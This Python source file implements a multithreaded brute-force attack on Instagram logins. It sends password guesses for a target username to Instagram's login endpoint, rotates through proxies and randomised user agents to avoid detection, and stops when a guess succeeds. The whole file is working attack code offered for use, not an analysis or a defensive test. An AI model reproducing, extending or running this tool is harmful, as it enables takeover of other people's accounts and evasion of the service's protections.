import itertools
import threading
import requests
from Printf import printf
from analyze import Analyze, get_date
from utils import percentage
from vars import options, proxies, passwords, retry_passwords
from useragent import Useragent

login_url = "https://www.instagram.com/accounts/login/ajax/"
url = "https://www.instagram.com/"
langs = "en-GB,en-US;q=0.9,en;q=0.8" # en-GB,en-US;q=0.9,en;q=0.8
headers = {
    'authority': 'www.instagram.com',
    'content-type': 'application/x-www-form-urlencoded',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
    'origin': url,
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': url,
    'accept-language': langs
}
http = "http"
https = "https"
login_payload = lambda username,password:f'username={username}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{password}&queryParams=%7B%7D&optIntoOneTap=false'
proxy_scheme = lambda protocol,ip,port:{http: "%s://%s:%s" % (protocol, ip, port), https: "%s://%s:%s" % (protocol, ip, port)}


stop_threads = False
def Login(password, proxy_id:str):
    global stop_threads
    proxy_protocol = proxies[proxy_id]["protocol"]
    proxy_ip = proxies[proxy_id]["ip"]
    proxy_port = proxies[proxy_id]["port"]
    # proxy_password = proxies[proxy_id]["password"]

    headers['User-Agent'] = Useragent.Devices().random()
    try:
        p1 = proxy_scheme(proxy_protocol, proxy_ip, proxy_port)
        p2 = login_payload(username=options['target'], password=password)
        response = requests.post(login_url, headers=headers, data=p2, proxies=p1, timeout=options['timeout'])

        answer = Analyze().response(password=password, response=response, pid=proxy_id)
        if answer:
            stop_threads = True
            response.close()
        if stop_threads:
            return
    except Exception as error:
        printf(f"Error [{get_date()}]: '{error}'", mt="error")

def start_bruteforce(): # pid=proxy id
    threads = []
    global progress
    if len(passwords) > 0 and len(proxies) > 0:
        retry_passwords.clear()
        done_with = 0

        for psd, prx in zip(passwords, itertools.cycle(proxies)):
            printf(f"Trying: [{get_date()}] - {options['target']} => {psd}")
            thread = threading.Thread(target=Login, args=(psd, prx, ))
            thread.start()
            threads.append(thread)
            done_with += 1

            progress = percentage(a=len(passwords), p=done_with)

        for t in threads:
            t.join()